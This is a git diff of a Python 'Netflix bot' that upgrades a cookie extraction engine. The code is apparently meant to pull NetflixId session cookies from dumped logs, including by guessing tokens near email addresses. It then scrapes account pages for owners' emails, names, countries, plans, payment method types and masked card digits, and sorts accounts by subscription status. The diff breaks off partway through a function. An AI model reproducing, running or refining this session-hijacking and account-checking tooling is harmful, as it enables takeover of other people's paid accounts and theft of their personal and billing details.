@@ -1,6 +1,6 @@
 """
-SENZO NETFLIX BOT - ULTIMATE EDITION v5.0
-Merged with Advanced Cookie Extraction Engine
+SENZO NETFLIX BOT - ULTIMATE EDITION v6.0
+Advanced Cookie Extraction Engine - Production Ready
 Author: @Senzo268
 """
 
@@ -26,10 +26,11 @@ import copy
 import queue
 from datetime import datetime, timedelta, timezone
 from typing import Dict, List, Optional, Tuple, Any, Union
-from dataclasses import dataclass
+from dataclasses import dataclass, field
 from contextlib import contextmanager
 from functools import wraps
 from urllib.parse import quote, unquote
+from concurrent.futures import ThreadPoolExecutor, as_completed
 
 # ============================================================
 # ENVIRONMENT SETUP
@@ -46,7 +47,6 @@ if sys.platform == "win32":
 import requests
 import urllib3
 from dotenv import load_dotenv
-from concurrent.futures import ThreadPoolExecutor, as_completed
 
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
@@ -129,270 +129,8 @@ logging.basicConfig(
 logger = logging.getLogger(__name__)
 
 # ============================================================
-# ADVANCED DECODING FUNCTIONS (From Second File)
+# CORE UTILITY FUNCTIONS
 # ============================================================
-
-def decode_netflix_value(value):
-    """Advanced Netflix value decoder with Unicode and URL handling."""
-    if value is None:
-        return None
-    cleaned = html.unescape(str(value))
-    
-    # Common replacements
-    replacements = {
-        "\\x20": " ",
-        "\\u00A0": " ",
-        "\\u00a0": " ",
-        "&nbsp;": " ",
-        "u00A0": " ",
-    }
-    for source, target in replacements.items():
-        cleaned = cleaned.replace(source, target)
-    
-    cleaned = cleaned.replace("\\/", "/").replace('\\"', '"').replace("\\n", " ").replace("\\t", " ")
-    
-    # Unicode escape handling
-    for _ in range(3):
-        previous = cleaned
-        cleaned = re.sub(r"\\u([0-9a-fA-F]{4})", lambda m: chr(int(m.group(1), 16)), cleaned)
-        cleaned = re.sub(r"\\x([0-9a-fA-F]{2})", lambda m: chr(int(m.group(1), 16)), cleaned)
-        cleaned = re.sub(r"(?<!\\)\bu([0-9a-fA-F]{4})(?![0-9a-fA-F])", lambda m: chr(int(m.group(1), 16)), cleaned)
-        cleaned = cleaned.replace("\\\\", "\\")
-        if cleaned == previous:
-            break
-    
-    # URL decode
-    try:
-        cleaned = unquote(cleaned)
-    except Exception:
-        pass
-    
-    # Strip query parameters from NetflixId
-    if "&" in cleaned and ("ct=" in cleaned or "ch=" in cleaned):
-        cleaned = cleaned.split("&")[0]
-    
-    # Remove ct= prefix
-    if cleaned.startswith("ct="):
-        cleaned = cleaned[3:]
-    
-    cleaned = re.sub(r"\s+", " ", cleaned).strip()
-    return cleaned or None
-
-# ============================================================
-# ADDITIONAL HELPER FUNCTIONS (FIXES FOR ISSUES)
-# ============================================================
-
-def parse_localized_date(value):
-    """Parse localized date string to datetime."""
-    cleaned = decode_netflix_value(value)
-    if not cleaned:
-        return None
-    
-    # Try standard ISO formats
-    for fmt in ("%Y-%m-%d", "%Y-%m-%dT%H:%M:%S", "%Y-%m-%dT%H:%M:%S.%f", "%Y-%m-%dT%H:%M:%S.%f%z"):
-        try:
-            return datetime.strptime(cleaned[:19], fmt)
-        except:
-            continue
-    
-    # Try month name parsing
-    month_map = {
-        "january": 1, "february": 2, "march": 3, "april": 4,
-        "may": 5, "june": 6, "july": 7, "august": 8,
-        "september": 9, "october": 10, "november": 11, "december": 12
-    }
-    cleaned_lower = cleaned.lower()
-    for month_name, month_num in month_map.items():
-        if month_name in cleaned_lower:
-            year_match = re.search(r'\b(\d{4})\b', cleaned)
-            if year_match:
-                try:
-                    year = int(year_match.group(1))
-                    return datetime(year, month_num, 1)
-                except:
-                    pass
-            break
-    
-    return None
-
-def format_member_since(value):
-    """Format member since date."""
-    cleaned = decode_netflix_value(value)
-    if not cleaned:
-        return "UNKNOWN"
-    
-    parsed = parse_localized_date(cleaned)
-    if parsed:
-        return parsed.strftime("%B %Y")
-    
-    # Try to extract month and year from text
-    month_map = {
-        "january": 1, "february": 2, "march": 3, "april": 4,
-        "may": 5, "june": 6, "july": 7, "august": 8,
-        "september": 9, "october": 10, "november": 11, "december": 12
-    }
-    cleaned_lower = cleaned.lower()
-    for month_name, month_num in month_map.items():
-        if month_name in cleaned_lower:
-            year_match = re.search(r'\b(\d{4})\b', cleaned)
-            if year_match:
-                try:
-                    year = int(year_match.group(1))
-                    return f"{month_name.capitalize()} {year}"
-                except:
-                    pass
-            break
-    
-    return cleaned
-
-def is_on_hold_account(info):
-    """Check if account is on hold."""
-    if not info:
-        return False
-    hold_value = format_boolean_label(info.get("holdStatus"))
-    if hold_value is not None:
-        return hold_value == "Yes"
-    membership_status = normalize_plan_key(info.get("membershipStatus") or "")
-    return any(token in membership_status for token in ("hold", "past_due", "payment_retry", "paused", "suspend"))
-
-def is_extra_member_account(info):
-    """Check if account is an extra member account."""
-    if not isinstance(info, dict):
-        return False
-    
-    explicit_flag = info.get("isExtraMemberAccount")
-    if explicit_flag in (True, "Yes", "yes", "true", "1"):
-        return True
-    
-    # Check plan name for extra member indicators
-    plan_name = decode_netflix_value(info.get("localizedPlanName") or "")
-    if plan_name and "extra member" in plan_name.lower():
-        return True
-    
-    return False
-
-def is_active_subscription(info):
-    """Check if account has an active subscription with future billing."""
-    if not info:
-        return False
-    next_billing = info.get("nextBillingDate")
-    if not next_billing:
-        return False
-    parsed = parse_localized_date(next_billing)
-    if parsed is None:
-        return False
-    return parsed.date() > datetime.now().date()
-
-def parse_boolean_value(value):
-    """Parse boolean from various formats."""
-    if isinstance(value, bool):
-        return value
-    if isinstance(value, (int, float)) and not isinstance(value, bool):
-        if value == 1:
-            return True
-        if value == 0:
-            return False
-        return None
-    cleaned = decode_netflix_value(value)
-    if cleaned is None:
-        return None
-    lowered = str(cleaned).strip().lower()
-    truthy = {"true", "yes", "1", "on"}
-    falsy = {"false", "no", "0", "off"}
-    if lowered in truthy:
-        return True
-    if lowered in falsy:
-        return False
-    return None
-
-def format_boolean_label(value):
-    """Format boolean as Yes/No."""
-    parsed = parse_boolean_value(value)
-    if parsed is True:
-        return "Yes"
-    if parsed is False:
-        return "No"
-    return None
-
-def normalize_output_value(value, unknown_fallback="UNKNOWN", na_when_false=False):
-    """Normalize output value with fallback."""
-    cleaned = decode_netflix_value(value)
-    if cleaned is None or cleaned == "":
-        return unknown_fallback
-    lowered = str(cleaned).strip().lower()
-    if lowered in {"false", "none", "null"}:
-        return "N/A" if na_when_false else unknown_fallback
-    return cleaned
-
-def format_display_date(value):
-    """Format date for display."""
-    cleaned = decode_netflix_value(value)
-    if not cleaned:
-        return "UNKNOWN"
-    try:
-        for fmt in ("%Y-%m-%d", "%Y-%m-%dT%H:%M:%S", "%Y-%m-%dT%H:%M:%S.%f"):
-            try:
-                dt = datetime.strptime(cleaned[:19], fmt)
-                return dt.strftime("%B %d, %Y")
-            except:
-                continue
-    except:
-        pass
-    return cleaned
-
-def normalize_phone_number(value, country_code=None):
-    """Normalize phone number."""
-    cleaned = decode_netflix_value(value)
-    if not cleaned:
-        return None
-    if str(cleaned).startswith("+"):
-        return cleaned
-    digits = re.sub(r"\D+", "", str(cleaned))
-    if not digits:
-        return cleaned
-    return cleaned
-
-def country_code_to_flag(country_code):
-    """Convert country code to emoji flag."""
-    raw = (decode_netflix_value(country_code) or "").strip()
-    if not raw:
-        return ""
-    upper = raw.upper()
-    if len(upper) == 2 and upper.isalpha():
-        return "".join(chr(127397 + ord(char)) for char in upper)
-    return ""
-
-def format_country_with_flag(country_value, unknown_fallback="UNKNOWN"):
-    """Format country with flag emoji."""
-    normalized_country = normalize_output_value(country_value, unknown_fallback=unknown_fallback)
-    country_flag = country_code_to_flag(normalized_country)
-    if country_flag:
-        return f"{normalized_country} {country_flag}"
-    return normalized_country
-
-def normalize_plan_key(plan_name):
-    """Normalize plan name to key."""
-    if not plan_name:
-        return "unknown"
-    simplified = unicodedata.normalize("NFKD", plan_name)
-    simplified = "".join(ch for ch in simplified if not unicodedata.combining(ch))
-    normalized = re.sub(r"[^\w]+", "_", simplified.lower(), flags=re.UNICODE).strip("_")
-    return normalized or "unknown"
-
-def get_canonical_output_label(plan_key):
-    """Get canonical label for plan."""
-    canonical_labels = {
-        "premium": "Premium",
-        "standard_with_ads": "Standard With Ads",
-        "standard": "Standard",
-        "basic": "Basic",
-        "mobile": "Mobile",
-        "extra_member_premium": "Premium (Extra Member)",
-        "free": "Free",
-        "duplicate": "Duplicate",
-        "unknown": "Unknown",
-    }
-    return canonical_labels.get(plan_key, "Unknown")
 
 def safe_str(value: Any, default: str = "Unknown") -> str:
     if value is None:
@@ -445,7 +183,300 @@ def retry_on_failure(max_retries: int = 3, delay: float = 1.0):
     return decorator
 
 # ============================================================
-# ADVANCED COOKIE EXTRACTION ENGINE (From Second File)
+# ADVANCED DECODING ENGINE
+# ============================================================
+
+def decode_netflix_value(value):
+    """Ultimate Netflix value decoder with aggressive cleaning."""
+    if value is None:
+        return None
+    
+    # HTML unescape first
+    cleaned = html.unescape(str(value))
+    
+    # Common replacements
+    replacements = {
+        "\\x20": " ",
+        "\\u00A0": " ",
+        "\\u00a0": " ",
+        "&nbsp;": " ",
+        "u00A0": " ",
+        "\\/": "/",
+        '\\"': '"',
+        "\\n": " ",
+        "\\t": " ",
+        "\n": " ",
+        "\r": " ",
+    }
+    for source, target in replacements.items():
+        cleaned = cleaned.replace(source, target)
+    
+    # Unicode escape handling (multiple passes)
+    for _ in range(3):
+        previous = cleaned
+        cleaned = re.sub(r"\\u([0-9a-fA-F]{4})", lambda m: chr(int(m.group(1), 16)), cleaned)
+        cleaned = re.sub(r"\\x([0-9a-fA-F]{2})", lambda m: chr(int(m.group(1), 16)), cleaned)
+        cleaned = re.sub(r"(?<!\\)\bu([0-9a-fA-F]{4})(?![0-9a-fA-F])", lambda m: chr(int(m.group(1), 16)), cleaned)
+        cleaned = cleaned.replace("\\\\", "\\")
+        if cleaned == previous:
+            break
+    
+    # URL decode
+    try:
+        cleaned = unquote(cleaned)
+    except Exception:
+        pass
+    
+    # AGGRESSIVE NetflixId cleaning
+    # Remove ct= prefix
+    if cleaned.startswith("ct="):
+        cleaned = cleaned[3:]
+    
+    # Strip query parameters
+    if "&" in cleaned:
+        cleaned = cleaned.split("&")[0]
+    if "%26" in cleaned:
+        cleaned = cleaned.split("%26")[0]
+    if "?" in cleaned:
+        cleaned = cleaned.split("?")[0]
+    
+    # Remove any remaining URL-encoded characters
+    try:
+        cleaned = unquote(cleaned)
+    except Exception:
+        pass
+    
+    # Normalize whitespace
+    cleaned = re.sub(r"\s+", " ", cleaned).strip()
+    
+    return cleaned or None
+
+def parse_localized_date(value):
+    """Parse localized date string to datetime with multiple formats."""
+    cleaned = decode_netflix_value(value)
+    if not cleaned:
+        return None
+    
+    # ISO formats
+    iso_formats = [
+        "%Y-%m-%d",
+        "%Y-%m-%dT%H:%M:%S",
+        "%Y-%m-%dT%H:%M:%S.%f",
+        "%Y-%m-%dT%H:%M:%S.%f%z",
+        "%Y-%m-%d %H:%M:%S",
+        "%b %d, %Y",
+        "%B %d, %Y",
+        "%d %b %Y",
+        "%d %B %Y",
+    ]
+    for fmt in iso_formats:
+        try:
+            return datetime.strptime(cleaned[:19], fmt)
+        except:
+            continue
+    
+    # Month name parsing
+    month_map = {
+        "january": 1, "february": 2, "march": 3, "april": 4,
+        "may": 5, "june": 6, "july": 7, "august": 8,
+        "september": 9, "october": 10, "november": 11, "december": 12,
+        "jan": 1, "feb": 2, "mar": 3, "apr": 4,
+        "jun": 6, "jul": 7, "aug": 8, "sep": 9, "oct": 10, "nov": 11, "dec": 12,
+        "enero": 1, "febrero": 2, "marzo": 3, "abril": 4,
+        "mayo": 5, "junio": 6, "julio": 7, "agosto": 8,
+        "septiembre": 9, "octubre": 10, "noviembre": 11, "diciembre": 12,
+    }
+    cleaned_lower = cleaned.lower()
+    for month_name, month_num in month_map.items():
+        if month_name in cleaned_lower:
+            year_match = re.search(r'\b(\d{4})\b', cleaned)
+            if year_match:
+                try:
+                    year = int(year_match.group(1))
+                    if 2400 <= year <= 2700:  # Thai calendar
+                        year -= 543
+                    if 1900 <= year <= 3000:
+                        return datetime(year, month_num, 1)
+                except:
+                    pass
+            break
+    
+    # Try numeric extraction (MM/DD/YYYY or DD/MM/YYYY)
+    numeric_parts = re.findall(r'\b(\d{1,4})\b', cleaned)
+    if len(numeric_parts) >= 3:
+        try:
+            parts = [int(x) for x in numeric_parts[:3]]
+            # Try YYYY-MM-DD
+            if 1900 <= parts[0] <= 3000 and 1 <= parts[1] <= 12 and 1 <= parts[2] <= 31:
+                return datetime(parts[0], parts[1], parts[2])
+            # Try MM/DD/YYYY
+            if 1 <= parts[0] <= 12 and 1 <= parts[1] <= 31 and 1900 <= parts[2] <= 3000:
+                return datetime(parts[2], parts[0], parts[1])
+            # Try DD/MM/YYYY
+            if 1 <= parts[0] <= 31 and 1 <= parts[1] <= 12 and 1900 <= parts[2] <= 3000:
+                return datetime(parts[2], parts[1], parts[0])
+        except:
+            pass
+    
+    return None
+
+def format_display_date(value):
+    """Format date for display with proper localization."""
+    cleaned = decode_netflix_value(value)
+    if not cleaned:
+        return "UNKNOWN"
+    parsed = parse_localized_date(cleaned)
+    if parsed:
+        return parsed.strftime("%B %d, %Y").replace(" 0", " ")
+    return cleaned
+
+def format_member_since(value):
+    """Format member since date."""
+    cleaned = decode_netflix_value(value)
+    if not cleaned:
+        return "UNKNOWN"
+    parsed = parse_localized_date(cleaned)
+    if parsed:
+        return parsed.strftime("%B %Y")
+    return cleaned
+
+def normalize_phone_number(value, country_code=None):
+    """Normalize phone number with country code."""
+    cleaned = decode_netflix_value(value)
+    if not cleaned:
+        return None
+    if str(cleaned).startswith("+"):
+        return cleaned
+    digits = re.sub(r"\D+", "", str(cleaned))
+    if not digits:
+        return cleaned
+    if digits.startswith("0") and len(digits) >= 10:
+        return f"+{digits}"
+    return cleaned
+
+def parse_boolean_value(value):
+    """Parse boolean from various formats."""
+    if isinstance(value, bool):
+        return value
+    if isinstance(value, (int, float)):
+        return bool(value)
+    cleaned = decode_netflix_value(value)
+    if not cleaned:
+        return None
+    lowered = str(cleaned).strip().lower()
+    if lowered in {"true", "yes", "1", "on", "t", "y"}:
+        return True
+    if lowered in {"false", "no", "0", "off", "f", "n"}:
+        return False
+    return None
+
+def format_boolean_label(value):
+    """Format boolean as Yes/No."""
+    parsed = parse_boolean_value(value)
+    if parsed is True:
+        return "Yes"
+    if parsed is False:
+        return "No"
+    return None
+
+def normalize_output_value(value, unknown_fallback="UNKNOWN", na_when_false=False):
+    """Normalize output value with fallback."""
+    cleaned = decode_netflix_value(value)
+    if not cleaned:
+        return unknown_fallback
+    lowered = str(cleaned).strip().lower()
+    if lowered in {"false", "none", "null", "undefined"}:
+        return "N/A" if na_when_false else unknown_fallback
+    return cleaned
+
+def country_code_to_flag(country_code):
+    """Convert country code to emoji flag."""
+    raw = (decode_netflix_value(country_code) or "").strip()
+    if not raw:
+        return ""
+    upper = raw.upper()
+    if len(upper) == 2 and upper.isalpha():
+        return "".join(chr(127397 + ord(char)) for char in upper)
+    return ""
+
+def format_country_with_flag(country_value, unknown_fallback="UNKNOWN"):
+    """Format country with flag emoji."""
+    normalized_country = normalize_output_value(country_value, unknown_fallback=unknown_fallback)
+    country_flag = country_code_to_flag(normalized_country)
+    if country_flag:
+        return f"{normalized_country} {country_flag}"
+    return normalized_country
+
+def normalize_plan_key(plan_name):
+    """Normalize plan name to key."""
+    if not plan_name:
+        return "unknown"
+    simplified = unicodedata.normalize("NFKD", plan_name)
+    simplified = "".join(ch for ch in simplified if not unicodedata.combining(ch))
+    normalized = re.sub(r"[^\w]+", "_", simplified.lower(), flags=re.UNICODE).strip("_")
+    return normalized or "unknown"
+
+def get_canonical_output_label(plan_key):
+    """Get canonical label for plan."""
+    canonical_labels = {
+        "premium": "Premium",
+        "standard_with_ads": "Standard With Ads",
+        "standard": "Standard",
+        "basic": "Basic",
+        "mobile": "Mobile",
+        "extra_member_premium": "Premium (Extra Member)",
+        "free": "Free",
+        "duplicate": "Duplicate",
+        "unknown": "Unknown",
+        "family": "Family",
+        "student": "Student",
+    }
+    return canonical_labels.get(plan_key, plan_key.title() if plan_key else "Unknown")
+
+def is_on_hold_account(info):
+    """Check if account is on hold."""
+    if not info:
+        return False
+    hold_value = format_boolean_label(info.get("holdStatus"))
+    if hold_value is not None:
+        return hold_value == "Yes"
+    membership_status = normalize_plan_key(info.get("membershipStatus") or "")
+    hold_indicators = {"hold", "past_due", "payment_retry", "paused", "suspend", "delinquent"}
+    return any(indicator in membership_status for indicator in hold_indicators)
+
+def is_extra_member_account(info):
+    """Check if account is an extra member account."""
+    if not isinstance(info, dict):
+        return False
+    
+    explicit_flag = info.get("isExtraMemberAccount")
+    if explicit_flag in (True, "Yes", "yes", "true", "1"):
+        return True
+    
+    plan_name = decode_netflix_value(info.get("localizedPlanName") or "")
+    if plan_name and "extra member" in plan_name.lower():
+        return True
+    
+    membership_status = decode_netflix_value(info.get("membershipStatus") or "")
+    if membership_status and "extra" in membership_status.lower():
+        return True
+    
+    return False
+
+def is_active_subscription(info):
+    """Check if account has an active subscription with future billing."""
+    if not info:
+        return False
+    next_billing = info.get("nextBillingDate")
+    if not next_billing:
+        return False
+    parsed = parse_localized_date(next_billing)
+    if parsed is None:
+        return False
+    return parsed.date() > datetime.now().date()
+
+# ============================================================
+# ADVANCED COOKIE EXTRACTION ENGINE
 # ============================================================
 
 # Netflix cookie constants
@@ -463,9 +494,8 @@ def is_netflix_domain(domain):
     return "netflix." in normalized
 
 def canonicalize_netflix_cookie_name(name):
-    """Canonicalize cookie name."""
+    """Canonicalize cookie name with mapping."""
     normalized = str(name or "").strip()
-    # Map variations to standard names
     name_map = {
         "netflixid": "NetflixId",
         "nfid": "NetflixId",
@@ -474,6 +504,8 @@ def canonicalize_netflix_cookie_name(name):
         "token": "NetflixId",
         "accesstoken": "NetflixId",
         "auth": "NetflixId",
+        "auth_token": "NetflixId",
+        "sid": "NetflixId",
     }
     return name_map.get(normalized.lower(), CANONICAL_NETFLIX_COOKIE_NAMES.get(normalized.lower(), name))
 
@@ -595,6 +627,7 @@ def extract_json_cookie_entries(content):
         json_data = json.loads(content)
     except Exception:
         return []
+    
     if isinstance(json_data, dict):
         if isinstance(json_data.get("cookies"), list):
             json_data = json_data["cookies"]
@@ -602,8 +635,10 @@ def extract_json_cookie_entries(content):
             json_data = json_data["items"]
         else:
             json_data = [json_data]
+    
     if not isinstance(json_data, list):
         return []
+    
     entries = []
     for index, cookie in enumerate(json_data):
         if not isinstance(cookie, dict):
@@ -627,7 +662,7 @@ def extract_json_cookie_entries(content):
     return entries
 
 def extract_raw_cookie_entries(raw_text):
-    """Extract cookies from raw text using regex."""
+    """Extract cookies from raw text using aggressive regex."""
     # Build pattern dynamically
     pattern = re.compile(
         rf"(?:['\"])?(?P<name>{'|'.join(sorted((re.escape(name) for name in ALL_NETFLIX_COOKIE_NAMES), key=len, reverse=True))})(?:['\"])?"
@@ -642,10 +677,30 @@ def extract_raw_cookie_entries(raw_text):
             value = value[1:-1]
         else:
             value = value.rstrip(",")
-        # Clean the value
+        
+        # AGGRESSIVE CLEANING
         cleaned_value = decode_netflix_value(value)
         if not cleaned_value:
             continue
+        
+        # Additional cleaning for NetflixId
+        if cookie_name == "NetflixId":
+            # Remove ct= prefix
+            if cleaned_value.startswith("ct="):
+                cleaned_value = cleaned_value[3:]
+            # Remove query params
+            if "&" in cleaned_value:
+                cleaned_value = cleaned_value.split("&")[0]
+            if "%26" in cleaned_value:
+                cleaned_value = cleaned_value.split("%26")[0]
+            if "?" in cleaned_value:
+                cleaned_value = cleaned_value.split("?")[0]
+            # Final URL decode
+            try:
+                cleaned_value = unquote(cleaned_value)
+            except Exception:
+                pass
+        
         entries.append(
             build_netscape_cookie_entry(
                 ".netflix.com",
@@ -664,12 +719,14 @@ def build_cookie_bundles_from_entries(entries):
     """Build cookie bundles from entries."""
     if not entries:
         return []
+    
     entries_by_name = {}
     for entry in entries:
         cookie_name = entry.get("name")
         if not cookie_name:
             continue
         entries_by_name.setdefault(cookie_name, []).append(entry)
+    
     if not entries_by_name:
         return []
     
@@ -698,33 +755,53 @@ def build_cookie_bundles_from_entries(entries):
     return bundles
 
 def extract_netflix_cookie_bundles(content):
-    """Extract all cookie bundles from content."""
-    # Try JSON first
+    """Extract all cookie bundles from content with multiple strategies."""
+    # Strategy 1: JSON
     bundles = build_cookie_bundles_from_entries(extract_json_cookie_entries(content))
     if bundles:
         return bundles
     
-    # Try Netscape
+    # Strategy 2: Netscape
     bundles = build_cookie_bundles_from_entries(extract_netscape_cookie_entries(content))
     if bundles:
         return bundles
     
-    # Try Raw regex
+    # Strategy 3: Raw regex
     bundles = build_cookie_bundles_from_entries(extract_raw_cookie_entries(content))
     if bundles:
         return bundles
     
-    # FINAL FALLBACK: Try to extract any long token
+    # Strategy 4: ULTIMATE FALLBACK - Extract any long token
+    # Look for base64-like tokens
     long_tokens = re.findall(r'[A-Za-z0-9+/=]{40,}', content)
     for token in long_tokens:
-        if "ct=" not in token and "%" not in token[:20]:
-            cleaned_token = decode_netflix_value(token)
-            if cleaned_token and len(cleaned_token) > 20:
+        cleaned_token = decode_netflix_value(token)
+        if cleaned_token and len(cleaned_token) > 30:
+            # Check if it looks like a valid NetflixId (starts with ct= or has typical pattern)
+            bundles = [{
+                "index": 1,
+                "total": 1,
+                "netscape_text": f".netflix.com\tTRUE\t/\tFALSE\t0\tNetflixId\t{cleaned_token}",
+                "cookies": {"NetflixId": cleaned_token}
+            }]
+            return bundles
+    
+    # Strategy 5: Look for email + token combination
+    email_match = re.search(r'([a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,})', content)
+    if email_match:
+        email = email_match.group(1)
+        # Look for any long string near the email
+        context_start = max(0, email_match.start() - 200)
+        context = content[context_start:email_match.end() + 200]
+        token_match = re.search(r'[A-Za-z0-9+/=]{40,}', context)
+        if token_match:
+            cleaned_token = decode_netflix_value(token_match.group(0))
+            if cleaned_token and len(cleaned_token) > 30:
                 bundles = [{
                     "index": 1,
                     "total": 1,
                     "netscape_text": f".netflix.com\tTRUE\t/\tFALSE\t0\tNetflixId\t{cleaned_token}",
-                    "cookies": {"NetflixId": cleaned_token}
+                    "cookies": {"NetflixId": cleaned_token, "email": email}
                 }]
                 return bundles
     
@@ -738,7 +815,7 @@ def extract_netflix_cookie_text(content):
     return bundles[0]["netscape_text"]
 
 # ============================================================
-# ENHANCED NETFLIX SERVICE (Merged)
+# ENHANCED NETFLIX SERVICE
 # ============================================================
 
 class NetflixService:
@@ -749,39 +826,33 @@ class NetflixService:
         "premium": {
             "premium", "高級", "高级", "cao_cap", "ozel", "المميزة", 
             "พรีเมียม", "프리미엄", "プレミアム", "premium_plan",
-            "premium_extra_member", "extra_member_premium", "caocap"
+            "premium_extra_member", "extra_member_premium", "caocap",
+            "ultra", "4k", "uhd"
         },
         "standard_with_ads": {
             "standard_with_ads", "standardwithads", "estandar_con_anuncios",
-            "padrao_com_anuncios", "광고형_스탠다드"
+            "padrao_com_anuncios", "광고형_스탠다드", "standard with ads",
+            "standar con anuncios", "standard con pubblicità"
         },
         "standard": {
             "standard", "estandar", "标准", "標準", "standardowy", 
-            "padrao", "standart", "スタンダード", "standardni", "standaard"
+            "padrao", "standart", "スタンダード", "standardni", "standaard",
+            "hd", "full hd", "1080p"
         },
         "basic": {
             "basic", "basico", "dasar", "基本", "베이직", "ベーシック", 
-            "temel", "พื้นฐาน", "podstawowy", "osnovni", "alap"
+            "temel", "พื้นฐาน", "podstawowy", "osnovni", "alap",
+            "sd", "480p"
         },
         "mobile": {
             "mobile", "ponsel", "seluler", "movil", "มือถือ", "모바일", "モバイル"
         },
-    }
-    
-    # Month aliases for date parsing
-    MONTH_ALIASES = {
-        "january": 1, "enero": 1, "janvier": 1, "januar": 1, "janeiro": 1,
-        "february": 2, "febrero": 2, "fevrier": 2, "fevereiro": 2,
-        "march": 3, "marzo": 3, "mars": 3, "marco": 3, "marzec": 3,
-        "april": 4, "abril": 4, "avril": 4, "kwiecien": 4,
-        "may": 5, "mayo": 5, "mai": 5, "maj": 5,
-        "june": 6, "junio": 6, "juin": 6, "haziran": 6, "czerwiec": 6,
-        "july": 7, "julio": 7, "juillet": 7, "temmuz": 7, "lipiec": 7,
-        "august": 8, "agosto": 8, "aout": 8, "août": 8, "sierpien": 8,
-        "september": 9, "septiembre": 9, "setembro": 9, "eylul": 9, "wrzesien": 9,
-        "october": 10, "octubre": 10, "outubro": 10, "ekim": 10, "pazdziernik": 10,
-        "november": 11, "noviembre": 11, "novembro": 11, "kasim": 11, "listopad": 11,
-        "december": 12, "diciembre": 12, "dezembro": 12, "aralik": 12, "grudzien": 12,
+        "family": {
+            "family", "familia", "famille", "familie", "familj", "perkataan"
+        },
+        "student": {
+            "student", "estudiante", "etudiant", "studenten", "studente"
+        }
     }
     
     @staticmethod
@@ -802,7 +873,7 @@ class NetflixService:
     
     @staticmethod
     def parse_account_page(response_text: str) -> Dict:
-        """Advanced account parsing with GraphQL + fallback."""
+        """Advanced account parsing with GraphQL + multiple fallbacks."""
         info = {}
         
         # Try GraphQL parsing
@@ -844,32 +915,73 @@ class NetflixService:
             pass
         
         # Fallback: Regex extraction
-        if not info.get("email"):
-            email_match = re.search(r'"emailAddress"\s*:\s*"([^"]+)"', response_text)
-            if email_match:
-                info["email"] = decode_netflix_value(email_match.group(1))
-        if not info.get("accountOwnerName"):
-            name_match = re.search(r'"accountOwnerName"\s*:\s*"([^"]+)"', response_text)
-            if name_match:
-                info["accountOwnerName"] = decode_netflix_value(name_match.group(1))
-        if not info.get("countryOfSignup"):
-            country_match = re.search(r'"countryOfSignup"\s*:\s*"([^"]+)"', response_text)
-            if country_match:
-                info["countryOfSignup"] = decode_netflix_value(country_match.group(1))
-        if not info.get("nextBillingDate"):
-            billing_match = re.search(r'"nextBillingDate"\s*:\s*"([^"]+)"', response_text)
-            if billing_match:
-                info["nextBillingDate"] = decode_netflix_value(billing_match.group(1))
-        if not info.get("localizedPlanName"):
-            plan_match = re.search(r'"localizedPlanName"\s*:\s*"([^"]+)"', response_text)
-            if plan_match:
-                info["localizedPlanName"] = decode_netflix_value(plan_match.group(1))
+        regex_patterns = {
+            "email": [
+                r'"emailAddress"\s*:\s*"([^"]+)"',
+                r'"email"\s*:\s*"([^"]+)"',
+                r'"loginId"\s*:\s*"([^"]+)"',
+            ],
+            "accountOwnerName": [
+                r'"accountOwnerName"\s*:\s*"([^"]+)"',
+                r'"name"\s*:\s*"([^"]+)"',
+            ],
+            "countryOfSignup": [
+                r'"countryOfSignup"\s*:\s*"([^"]+)"',
+                r'"currentCountry"\s*:\s*"([^"]+)"',
+            ],
+            "nextBillingDate": [
+                r'"nextBillingDate"\s*:\s*"([^"]+)"',
+                r'"date"\s*:\s*"([^"T]+)T',
+            ],
+            "localizedPlanName": [
+                r'"localizedPlanName"\s*:\s*"([^"]+)"',
+                r'"planName"\s*:\s*"([^"]+)"',
+            ],
+            "membershipStatus": [
+                r'"membershipStatus"\s*:\s*"([^"]+)"',
+            ],
+            "userGuid": [
+                r'"userGuid"\s*:\s*"([^"]+)"',
+            ],
+            "maxStreams": [
+                r'"maxStreams"\s*:\s*"?([^",}]+)"?',
+            ],
+            "videoQuality": [
+                r'"videoQuality"\s*:\s*"([^"]+)"',
+            ],
+            "planPrice": [
+                r'"planPrice"\s*:\s*"([^"]+)"',
+                r'"formattedPrice"\s*:\s*"([^"]+)"',
+            ],
+            "paymentMethodType": [
+                r'"paymentMethod"\s*:\s*"([^"]+)"',
+                r'"paymentType"\s*:\s*"([^"]+)"',
+            ],
+            "maskedCard": [
+                r'"displayText"\s*:\s*"([^"]+)"',
+                r'"lastFour"\s*:\s*"([^"]+)"',
+            ],
+        }
+        
+        for key, patterns in regex_patterns.items():
+            if not info.get(key):
+                for pattern in patterns:
+                    match = re.search(pattern, response_text, re.IGNORECASE)
+                    if match:
+                        info[key] = decode_netflix_value(match.group(1))
+                        break
         
         # Extra member detection
         extra_patterns = (
-            r"assinante\s+extra\s+no\s+plano\s+de\s+outra\s+pessoa",
-            r"suscriptor\s+extra\s+en\s+el\s+plan\s+de\s+otra\s+persona",
-            r"extra\s+on\s+someone.?else.?s\s+plan",
+            r"assinante\s+extra",
+            r"suscriptor\s+extra",
+            r"extra\s+on\s+someone",
+            r"extra\s+member",
+            r"miembro\s+extra",
+            r"membro\s+extra",
+            r"abbonato\s+extra",
+            r"abonne\s+supplementaire",
+            r"ekstra\s+uye",
         )
         if any(re.search(p, response_text, re.IGNORECASE) for p in extra_patterns):
             info["isExtraMemberAccount"] = True
@@ -881,15 +993,26 @@ class NetflixService:
         """Check if account has active subscription."""
         if not info:
             return False
+        
+        # Check membership status
         status = normalize_output_value(info.get("membershipStatus", "")).lower()
         if "current_member" in status:
             return True
-        if info.get("localizedPlanName"):
-            plan = normalize_output_value(info.get("localizedPlanName")).lower()
-            if not any(x in plan for x in ["free", "trial"]):
-                return True
+        
+        # Check plan name
+        plan = normalize_output_value(info.get("localizedPlanName", "")).lower()
+        free_indicators = {"free", "trial", "guest"}
+        if plan and not any(indicator in plan for indicator in free_indicators):
+            return True
+        
+        # Check billing date
         if info.get("nextBillingDate"):
             return True
+        
+        # Check if extra member (implies paid account)
+        if is_extra_member_account(info):
+            return True
+        
         return False
     
     @staticmethod
@@ -904,12 +1027,12 @@ class NetflixService:
             return "free", "Free"
         
         plan_name = normalize_output_value(info.get("localizedPlanName", "")).lower()
-        streams = info.get("maxStreams")
-        try:
-            streams = int(streams) if streams else 0
-        except:
-            streams = 0
+        streams = safe_int(info.get("maxStreams"))
         quality = normalize_output_value(info.get("videoQuality", "")).lower()
+        
